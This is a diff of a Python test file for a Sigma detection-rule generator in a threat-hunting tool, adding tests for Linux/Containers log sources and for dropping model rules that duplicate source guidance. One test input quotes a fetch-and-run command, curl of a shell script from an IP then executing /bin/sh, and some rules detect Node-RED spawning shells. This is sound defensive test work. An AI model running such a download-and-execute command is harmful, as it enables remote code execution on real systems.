@@ -150,6 +150,16 @@ def test_linux_file_rules_keep_the_hunt_platform():
     assert SigmaGeneratorAgent._logsource_block("file_event", ["Linux"]) == {"category": "file_event", "product": "linux"}
 
 
+def test_containers_do_not_count_as_a_second_os():
+    """H-0025 (Node-RED on IoT2050) was scoped Containers + Linux; its guidance
+    rule had no product, and the SentinelOne query came out EndpointOS = "windows"."""
+    assert SigmaGeneratorAgent._logsource_block("process_creation", ["Containers", "Linux"]) == {
+        "category": "process_creation",
+        "product": "linux",
+    }
+    assert SigmaGeneratorAgent._logsource_block("process_creation", ["Containers"]) == {"category": "process_creation"}
+
+
 def test_rule_id_is_unique_per_rule():
     a, _ = _agent()._build_rule(_rule(), _input())
     assert a is not None
@@ -1474,7 +1484,7 @@ def test_cloud_control_plane_rules_generates_identity_and_cloud_audit():
 
 
 def test_platform_preservation_and_strict_alignment_prompt():
-    agent = SigmaGeneratorAgent()
+    agent = SigmaGeneratorAgent(config={"llm": {"provider": "none"}})
     input_windows = SigmaGenerationInput(
         hypothesis="Windows APT29 hunt",
         threat_intel="Adversary downloaded payload via curl http://1.2.3.4/shell.sh and executed /bin/sh",
@@ -1491,3 +1501,34 @@ def test_platform_preservation_and_strict_alignment_prompt():
     # LLM is disabled, so it returns failure, but we check logsources/platforms behavior
     res = agent.execute(input_windows)
     assert not res.success  # No LLM configured
+
+
+def test_a_model_rule_duplicating_source_guidance_is_dropped():
+    """H-0025 kept a model rule for the same Node-RED-spawns-sh chain the
+    source's own guidance (G4) already gave, and the model's copy was wrong."""
+    from hecate_agent.agents.llm.sigma.models import SigmaRule
+    from hecate_agent.agents.llm.sigma_generator import _drop_model_rules_covered_by_guidance
+
+    guidance = SigmaRule(
+        logsource_category="process_creation",
+        title="Source guidance G4: Node launching sh",
+        rule_yaml=yaml.safe_dump({"detection": {"selection": {
+            "ParentImage|endswith": "/node", "ParentCommandLine|contains": "node-red",
+            "Image|endswith": "/sh", "CommandLine|contains": " -c "}, "condition": "selection"}}),
+        origin="deterministic",
+    )
+    duplicate = SigmaRule(
+        logsource_category="process_creation",
+        title="Node-RED Runtime Spawning Shell",
+        rule_yaml=yaml.safe_dump({"detection": {"a": {"Image|endswith": "/usr/bin/node-red"},
+                                                "b": {"CommandLine|contains": "/bin/sh"}, "condition": "a and b"}}),
+    )
+    distinct = SigmaRule(
+        logsource_category="process_creation",
+        title="Shell reads os-release",
+        rule_yaml=yaml.safe_dump({"detection": {"selection": {"Image|endswith": "/cat",
+                                                              "CommandLine|contains": "/etc/os-release"}, "condition": "selection"}}),
+    )
+    kept, dropped = _drop_model_rules_covered_by_guidance([guidance, duplicate, distinct])
+    assert kept == [guidance, distinct]
+    assert len(dropped) == 1 and "Node-RED Runtime Spawning Shell" in dropped[0]
